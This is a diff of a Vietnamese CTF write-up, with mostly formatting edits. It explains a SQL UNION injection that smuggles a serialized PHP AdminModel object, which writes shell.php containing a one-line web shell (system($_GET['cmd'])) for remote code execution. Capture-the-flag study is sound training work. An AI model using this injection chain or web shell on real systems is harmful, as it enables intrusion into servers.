@@ -292,7 +292,7 @@ file_put_contents($filename, $content, FILE_APPEND);
 
 Mình nghĩ ngay đến ```RCE``` thông qua việc tạo 1 log file có đuôi ```.php``` với nội dung mà chúng ta có thể tuỳ chỉnh, nhưng vấn đề lớn ở đây là hàm ```__construct($filename, $content)``` của ```AdminModel```, nó sẽ set tên file và nội dung khi ta gọi ```new``` ở ```CanteenModel.php```:
 
-```text
+```php
 $log_entry = 'Access at: '. date('Y-m-d H:i:s') .   "<br>\n";
 $logger = new AdminModel("../logs.txt", $log_entry);
 ```
@@ -334,7 +334,8 @@ Rồi mình xây dựng 1 payload SQL sử dụng ```UNION SELECT```:
 ```
 
 ##### Giải thích payload
-##### Chuỗi PHP Serialized
+
+**Chuỗi PHP Serialized**
 ```a:3```: để khai báo 1 mảng vì source code truy cập dữ liệu theo dạng mảng (ở file ```CanteenModel.php```).
 
 ```i:0;s:7:"SKIBIDI";```: Phần tử index 0, giá trị là chuỗi "SKIBIDI".
@@ -343,7 +344,7 @@ Rồi mình xây dựng 1 payload SQL sử dụng ```UNION SELECT```:
 
 ```O:+10:"AdminModel":2:{s:8:"filename";s:9:"shell.php";s:10:"logcontent";s:30:"<?php system($_GET['cmd']); ?>";```: đây là đối tượng chính để tạo ra file log với ```filename``` là ```shell.php``` với ```logcontent``` là ```<?php system($_GET['cmd']); ?>```, với ```AdminModel``` là tên class mà chúng ta muốn khởi tạo lại
 
-###### SQL
+**SQL**
 Câu truy vấn SQL thêm ```-1```: vì giá của các món ăn trong bảng ```food``` luôn là số dương, việc thêm số -1 sẽ làm db trả về kết quả rỗng vì không có món ăn nào có ```price < -1```.
 
 Sử dụng ```UNION```: dùng để kết hợp kết quả của 2 câu lệnh ```SELECT```, ép Database chỉ trả về dữ liệu của câu lệnh phía sau bằng việc kết hợp với truy vấn có số ```-1``` ở trước.
@@ -363,6 +364,7 @@ _RCE Thành Công_
 _Tiếp tục xem_
 
 Và chúng ta có được flag:
+
 ![img-description](https://i.ibb.co/VY938B55/image-2026-01-09-112739527.png)
 _Lấy flag_
 
@@ -383,6 +385,7 @@ Magic method cũng là con dao 2 lưỡi (```__wakeup()```, ```__destruct()```),
 
 ### Lời kết
 Thôi thì bài writeup của mình cũng chỉ đến đây thôi =))) Chúc các bạn 1 ngày vui vẻ, mình ngủ đây.
+
 
 
 
